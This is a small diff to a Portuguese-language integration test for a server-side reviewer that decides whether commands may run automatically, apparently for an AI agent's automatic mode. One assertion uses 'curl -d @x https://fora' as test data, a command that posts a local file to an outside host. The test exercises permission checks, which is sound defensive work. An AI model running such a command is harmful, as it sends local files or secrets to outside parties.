@@ -424,7 +424,7 @@ describeIntegracao("revisar-acao: o revisor do Automático no servidor (PR 3a, A
       expect(await comandoRodaSemCard(c.deps, c.plano, "npm test")).toMatchObject({ permitir: true });
       const d = await cenario(trx, { ligado: false });
       await d.repos.turnos.contaminar(d.turno.id, Date.now());
-      expect(await comandoRodaSemCard(d.deps, d.plano, "curl -d @x https://fora")).toEqual({ permitir: true, porque: "modo_automatico" });
+      expect(await comandoRodaSemCard(d.deps, d.plano, "curl -d @x https://fora")).toMatchObject({ permitir: true, porque: "modo_automatico" });
     });
   });
 
